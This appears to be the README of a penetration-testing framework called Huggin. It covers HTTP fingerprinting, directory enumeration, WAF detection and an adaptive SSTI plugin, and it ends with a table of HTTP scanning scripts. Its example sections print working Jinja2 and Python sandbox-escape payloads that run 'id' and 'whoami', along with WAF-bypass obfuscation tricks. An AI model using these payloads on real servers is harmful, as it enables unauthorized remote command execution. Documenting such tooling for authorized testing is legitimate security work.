# HTTP/S Fingerprinting Implementation - Complete

## Overview

The HTTP/S Fingerprinting functionality has been fully implemented and integrated into the Huggin security assessment framework. This implementation provides comprehensive web application analysis capabilities including technology detection, security assessment, and vulnerability identification.

## Features Implemented

### 1. Enhanced HTTP Fingerprinting (`http_fingerprint.py`)

- **Technology Detection**: Identifies web frameworks (Laravel, Express, WordPress, etc.)
- **Security Headers Analysis**: Evaluates security posture through header inspection
- **JavaScript Analysis**: Extracts and analyzes JavaScript files for API endpoints and encoded data
- **Known Files Detection**: Checks for common files like robots.txt, sitemap.xml, etc.
- **Content Analysis**: Parses HTML for forms, links, and meta information
- **Plugin System**: Extensible architecture for additional scanning capabilities

### 2. Advanced HTTP Scanner (`http_scanner.py`)

- **Multiple Scan Types**:
  - Basic Fingerprint: Quick technology identification
  - Directory Enum: Comprehensive directory/file discovery
  - Source Code: Analysis of client-side code
  - Crawler: Automated site crawling
  - Full Scan: Combined comprehensive assessment
- **Enhanced Output**: Rich HTML formatting with color-coded results
- **Progress Tracking**: Real-time scan progress updates
- **Error Handling**: Robust error management and reporting

### 3. AI-Driven SSTI/Sandbox Escape System

#### Core AI Engine (`ai_payload_engine.py`)
- **Response Classification**: EVALUATED, FILTERED, SYNTAX_ERROR, NEUTRAL, EXECUTED
- **8 Obfuscation Techniques**: String splitting, unicode homoglyphs, getattr() indirection, base64 encoding, character concatenation, format strings, list unpacking, dict access
- **Per-Target Learning**: Maintains cache of blocked tokens and working bypasses
- **Real-time Adaptation**: Modifies payloads based on target responses like a human pentester

#### AI SSTI Plugin (`ai_ssti_plugin.py`)
- **Multi-Endpoint Testing**: Discovers and tests potential SSTI endpoints
- **Adaptive Loop**: Maximum 5 rounds of payload evolution per endpoint
- **Framework-Specific Payloads**: Python, Jinja2, Flask-targeted attacks

### 4. Scan Plugins System

- **WAF Detection** (`waf_plugin.py`): Identifies Web Application Firewalls
- **CMS Detection** (`cms_plugin.py`): Recognizes Content Management Systems
- **Security Analysis** (`security_plugin.py`): Evaluates security configurations with AI-driven SSTI testing

### 4. Supporting Utilities

#### Encoders (`encoders.py`)

- Base64 detection and decoding
- URL encoding/decoding
- Hex encoding support
- ROT13 decoding
- JavaScript deobfuscation

#### WAF Detector (`waf_detector.py`)

- Cloudflare detection
- AWS WAF identification
- Akamai recognition
- ModSecurity detection
- And more...

#### TLS Fingerprinting (`tls_fingerprint.py`)

- TLS version detection
- Cipher suite analysis
- Certificate information extraction
- Security scoring

#### API Matcher (`api_matcher.py`)

- JavaScript endpoint extraction
- API accessibility testing
- Response type analysis
- Authentication detection

#### Web Crawler (`web_crawler.py`)

- Recursive site crawling
- Link extraction
- Form discovery
- Content analysis

### 5. Integration with Enumeration Page

- Seamless integration with the modular enumeration system
- Factory-based control panel generation
- Dynamic field visibility based on scan type
- Real-time result display and export

## File Structure

```bash
app/tools/
├── http_fingerprint.py          # Main fingerprinting engine with AI SSTI integration
├── http_scanner.py              # Enhanced HTTP scanner worker
├── http_utils.py                # Utility functions and helpers
├── encoders.py                  # Encoding/decoding utilities
├── waf_detector.py              # WAF detection engine
├── tls_fingerprint.py           # TLS analysis
├── api_matcher.py               # API endpoint matching
└── scan_plugins/
    ├── __init__.py              # Plugin loader
    ├── ai_ssti_plugin.py        # AI-driven SSTI testing plugin
    ├── waf_plugin.py            # WAF detection plugin
    ├── cms_plugin.py            # CMS detection plugin
    └── security_plugin.py       # Security analysis with AI integration

app/core/
├── ai_payload_engine.py         # AI payload adaptation engine
└── web_crawler.py               # Web crawling engine

resources/wordlists/http_enum/
├── common.txt                   # Common directories/files
└── api.txt                      # API-focused wordlist

tests/
└── test_http_fingerprint_complete.py  # Comprehensive tests
```

## Usage Examples

### Basic Fingerprinting

```python
from app.tools.http_fingerprint import HTTPFingerprinter

fingerprinter = HTTPFingerprinter()
results = fingerprinter.comprehensive_fingerprint("https://example.com")

print(f"Server: {results['technology']['server']}")
print(f"Frameworks: {results['technology']['frameworks']}")
print(f"Security Headers: {len(results['technology']['security_headers'])}")
```

### Directory Enumeration

```python
from app.tools.http_utils import run_http_enumeration

worker = run_http_enumeration(
    target="https://example.com",
    scan_type="Directory Enum",
    wordlist_path="/path/to/wordlist.txt",
    extensions=['.php', '.asp', '.jsp']
)
```

### AI-Driven SSTI Testing

```python
from app.tools.scan_plugins.ai_ssti_plugin import AISSTIPlugin
from app.core.ai_payload_engine import AIPayloadEngine, ResponseType
import asyncio

# Initialize AI SSTI plugin
ai_plugin = AISSTIPlugin(session, progress_callback)

# Run adaptive SSTI scan
results = await ai_plugin.scan("https://example.com", js_endpoints)

# View AI intelligence
intelligence = results['ai_intelligence']
print(f"Blocked tokens: {intelligence['blocked_tokens']}")
print(f"Working bypasses: {intelligence['working_bypasses']}")
print(f"Recommended approach: {intelligence['recommended_approach']}")

# Check adaptation history
for vuln in results['vulnerabilities']:
    for round_info in vuln['adaptation_history']:
        print(f"Round {round_info['round']}: {round_info['response_type']}")
```

## Scan Types Available

1. **Basic Fingerprint**: Quick technology identification and security header analysis
2. **Directory Enum**: Comprehensive directory and file discovery using wordlists
3. **Source Code**: Analysis of client-side code, comments, and exposed files
4. **Crawler**: Automated crawling to discover pages, forms, and links
5. **Full Scan**: Combined comprehensive assessment using all methods including AI-driven SSTI testing

## Security Features

### Technology Detection

- Web servers (Apache, Nginx, IIS)
- Programming languages (PHP, ASP.NET, Python, etc.)
- Frameworks (Laravel, Express, Django, etc.)
- Content Management Systems (WordPress, Joomla, Drupal)

### Security Analysis

- Security headers evaluation
- Cookie security assessment
- TLS/SSL configuration analysis
- WAF detection and bypass techniques
- Vulnerability indicators

### Advanced Capabilities

#### AI-Driven SSTI Testing
- **Adaptive Payload Generation**: Real-time response classification and evolution
- **8 Obfuscation Techniques**: String splitting, unicode homoglyphs, getattr() indirection, base64 encoding, character concatenation, format strings, list unpacking, dict access
- **Per-Target Learning**: Knowledge cache of blocked tokens and working bypasses
- **Human-like Adaptation**: Modifies attack strategies based on target responses
- **Multi-Framework Support**: Python/Jinja2, Flask, Django, Twig, Smarty, Freemarker
- **Sandbox Escape**: Python class traversal and builtin access

#### Traditional Capabilities
- JavaScript deobfuscation and API endpoint discovery
- Encoded data detection and certificate transparency log searching
- Threat intelligence integration and WAF detection
- TLS/SSL analysis and security header evaluation

## Configuration

### Wordlists

The system includes curated wordlists for different scan types:

- `common.txt`: General directories and files
- `api.txt`: API-focused endpoints and paths

### Extensions

Configurable file extensions for different technologies:

- PHP: .php, .php3, .php4, .php5, .phtml
- ASP: .asp, .aspx, .ascx, .ashx
- JSP: .jsp, .jspx, .do, .action
- And more...

## Testing

Run the comprehensive test suite:

```bash
python tests/test_http_fingerprint_complete.py
```

The test suite covers:

- Basic functionality
- Network requests (with graceful skipping if unavailable)
- Plugin system
- Utility functions
- Error handling

## Performance Considerations

- **Rate Limiting**: Built-in rate limiting to avoid overwhelming targets
- **Connection Pooling**: Efficient HTTP connection management
- **Memory Management**: Optimized for large-scale scanning
- **Progress Tracking**: Real-time progress updates for long-running scans

## Security Considerations

- **Stealth Options**: Configurable user agents and request patterns
- **Proxy Support**: Integration with proxy chains for anonymity
- **SSL/TLS Handling**: Proper certificate validation with bypass options
- **Error Handling**: Graceful handling of network errors and timeouts

## Future Enhancements

1. **Machine Learning Integration**: Pattern recognition for advanced threat detection
2. **Custom Plugin Development**: Framework for user-defined scanning plugins
3. **Distributed Scanning**: Multi-node scanning for large targets
4. **Advanced Reporting**: Executive summaries and detailed technical reports
5. **Integration APIs**: RESTful APIs for external tool integration

## AI SSTI System Architecture

### Response Classification Engine
- **EVALUATED**: Math/string output matches payload (7*7 = 49)
- **FILTERED**: Connection reset, WAF block, empty response  
- **SYNTAX_ERROR**: Template syntax errors detected
- **NEUTRAL**: Payload echoed back or ignored
- **EXECUTED**: Out-of-band callback received

### Payload Obfuscation Techniques
1. **String Splitting**: `"__cla" + "ss__"`
2. **Unicode Homoglyphs**: `cl\u0430ss`
3. **getattr() Indirection**: `getattr(globals()['__builtins__'], 'import')`
4. **Base64 Encoding**: `__import__('base64').b64decode('b3M=').decode()`
5. **Character Concatenation**: `chr(95) + chr(95) + 'class'`
6. **Format String**: `'{}'.format('token')`
7. **List Unpacking**: `[*'token'][0]`
8. **Dict Access**: `{'key': 'token'}['key']`

### AI Adaptation Process
```
Round 1: {{7*7}} → FILTERED (WAF block detected)
Round 2: AI generates obfuscated payload → EVALUATED (49 detected)
Round 3: {{config}} → FILTERED (token blocked)
Round 4: AI uses getattr() bypass → SUCCESS (config exposed)
```

## Dependencies

- `requests`: HTTP client library
- `beautifulsoup4`: HTML parsing
- `lxml`: XML/HTML parser
- `PyQt6`: GUI framework integration
- `cryptography`: SSL/TLS analysis
- `mitmproxy`: HTTP proxy functionality
- `asyncio`: Asynchronous AI SSTI testing
- `typing`: Type hints for AI engine components

## Real-World AI SSTI Examples

### Flask Application with WAF Bypass
```python
# Initial payload blocked
response_1 = {'status_code': 403, 'content': 'ModSecurity: Access denied'}
# AI Classification: FILTERED

# AI applies string obfuscation
obfuscated_payload = "{{('__cla' + 'ss__').__base__.__subclasses__()}}"
response_2 = {'status_code': 200, 'content': '[<class \'object\'>...]'}
# AI Classification: EVALUATED

# AI advances to command execution
cmd_payload = "{{url_for.__globals__['__builtins__']['__import__']('os').popen('id').read()}}"
```

### Python Sandbox Escape
```python
# AI detects Python execution environment
test_payload = "1+1"
response = {'status_code': 200, 'content': '2'}
# AI Classification: EVALUATED

# AI enumerates subclasses for Popen
enum_payload = "().__class__.__base__.__subclasses__()[104].__name__"
response = {'status_code': 200, 'content': 'Popen'}

# AI attempts command execution
exec_payload = "().__class__.__base__.__subclasses__()[104]('whoami', shell=True, stdout=-1).communicate()[0].decode()"
response = {'status_code': 200, 'content': 'www-data'}
```

## Conclusion

The HTTP/S Fingerprinting implementation now includes revolutionary AI-driven SSTI/sandbox escape capabilities that adapt payloads in real-time based on target responses. This creates a truly intelligent scanner that thinks like a human pentester, automatically learning from each interaction and evolving attack strategies to bypass filters and WAFs.

Key innovations:
- **Human-like decision making** with response classification
- **Real-time payload evolution** based on target feedback  
- **Per-target learning** that improves with each interaction
- **Strategic intelligence** that guides future testing approaches

The system provides comprehensive, extensible, and user-friendly solutions for web application security assessment, integrating seamlessly with the Huggin framework while maintaining modularity for future enhancements and customizations.

ENTERPRISE SCRIPTS (Needs ENTERPRISE License)

🔎 General HTTP Enumeration

| Script                    | Description                                                     |
| ------------------------- | --------------------------------------------------------------- |
| `http-title`              | Retrieves the HTML `<title>` tag                                |
| `http-headers`            | Grabs HTTP headers                                              |
| `http-server-header`      | Extracts the `Server:` header                                   |
| `http-methods`            | Enumerates supported HTTP methods (e.g. GET, POST, PUT, DELETE) |
| `http-trace`              | Checks if HTTP TRACE method is enabled                          |
| `http-robots.txt`         | Fetches and parses `robots.txt`                                 |
| `http-comments-displayer` | Shows HTML comments                                             |
| `http-enum`               | Attempts to enumerate directories and files using a wordlist    |
| `http-grep`               | Matches custom strings in web pages                             |

🔐 Authentication & Login

| Script             | Description                                        |
| ------------------ | -------------------------------------------------- |
| `http-auth-finder` | Checks for login forms or HTTP auth                |
| `http-auth`        | Tests HTTP Basic and Digest auth                   |
| `http-form-brute`  | Performs brute-force attacks on HTML login forms   |
| `http-brute`       | Attempts HTTP auth brute-force (Basic/Digest/NTLM) |

🔍 Technology & Version Detection

| Script                | Description                                           |
| --------------------- | ----------------------------------------------------- |
| `http-server-header`  | Checks for web server type/version                    |
| `http-php-version`    | Detects PHP version if disclosed                      |
| `http-wordpress-enum` | Enumerates WordPress version/users                    |
| `http-drupal-enum`    | Detects Drupal and enumerates users                   |
| `http-joomla-brute`   | Attempts Joomla login brute-force                     |
| `http-waf-detect`     | Detects Web Application Firewalls (e.g., ModSecurity) |
| `http-aspnet-debug`   | Checks if ASP.NET debug mode is enabled               |

🧰 Vulnerability Checks

| Script                      | Description                                      |
| --------------------------- | ------------------------------------------------ |
| `http-vuln-*`               | Multiple scripts for known web vulns (see below) |
| `http-csrf`                 | Checks for CSRF tokens                           |
| `http-shellshock`           | Tests for Shellshock vulnerability               |
| `http-dombased-xss`         | Detects DOM-based XSS                            |
| `http-stored-xss`           | Checks for stored XSS                            |
| `http-sql-injection`        | Probes for SQL injection vectors                 |
| `http-xssed`                | Checks if site is in xssed.com database          |
| `http-vuln-cve2017-5638`    | Apache Struts CVE-2017-5638                      |
| `http-vuln-cve2017-1001000` | PHPMyAdmin RCE                                   |
| `http-vuln-cve2014-3704`    | Drupal SQL injection (Drupalgeddon)              |
| `http-vuln-cve2015-1635`    | Microsoft HTTP.sys DoS                           |
| `http-vuln-cve2006-3392`    | HFS 2.3x remote command execution                |
| `http-vuln-cve2021-26855`   | Exchange SSRF                                    |
| `http-vuln-wnr1000-creds`   | Netgear WNR1000 default credentials              |

🧠 Fingerprinting, Info Gathering

| Script                  | Description                                 |
| ----------------------- | ------------------------------------------- |
| `http-favicon`          | Gets and hashes favicon for fingerprinting  |
| `http-security-headers` | Checks for HSTS, X-Frame-Options, CSP, etc. |
| `http-trane-info`       | Fingerprints Trane HVAC systems             |
| `http-devframework`     | Attempts to guess web dev framework         |
| `http-backup-finder`    | Looks for `.bak`, `.old`, `.zip`, etc.      |

🔒 SSL/TLS-specific Scripts

| Script                               | Description                                                |
| ------------------------------------ | ---------------------------------------------------------- |
| `ssl-cert`                           | Retrieves SSL certificate info                             |
| `ssl-enum-ciphers`                   | Enumerates supported SSL/TLS ciphers                       |
| `ssl-dh-params`                      | Checks for weak Diffie-Hellman params                      |
| `ssl-heartbleed`                     | Tests for Heartbleed vulnerability                         |
| `http-litespeed-sourcecode-download` | Exploits a LiteSpeed vuln to download PHP source via HTTPS |
